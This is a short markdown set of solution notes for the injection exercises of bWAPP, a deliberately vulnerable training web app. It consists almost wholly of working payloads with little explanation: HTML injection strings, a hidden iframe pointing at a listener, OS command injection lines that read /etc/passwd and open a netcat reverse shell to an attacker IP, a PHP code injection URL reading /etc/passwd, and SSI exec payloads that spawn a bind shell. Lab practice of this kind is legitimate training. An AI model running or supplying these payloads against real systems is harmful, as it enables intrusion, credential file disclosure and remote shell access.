# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
192.168.200.150/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```

### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```
### HTML Injection - Stored (Blog)

Following solution taken from:

```
<div class="code"><iframe SRC="http://192.168.200.130:775" height="0" width="0"></iframe></div>
```
Attacker's machine:
```
nc -lvp 775
```

### OS Command Injection
```
127.0.0.1; cat /etc/passwd
127.0.0.1 & cat /etc/passwd
127.0.0.1 | cat /etc/passwd
127.0.0.1 && nc -vn 192.168.254.128 775 -e /bin/bash
```

Attacker's machine:
```
nc -lvp 775
```


### OS Command Injection - Blind
```
127.0.0.1 | sleep 10
```

### PHP Code Injection

```
192.168.200.130/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```

### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="nc -lvp 775 -e /bin/bash" -->
Attacker's machine:
```
nc -nv 192.168.200.150 775









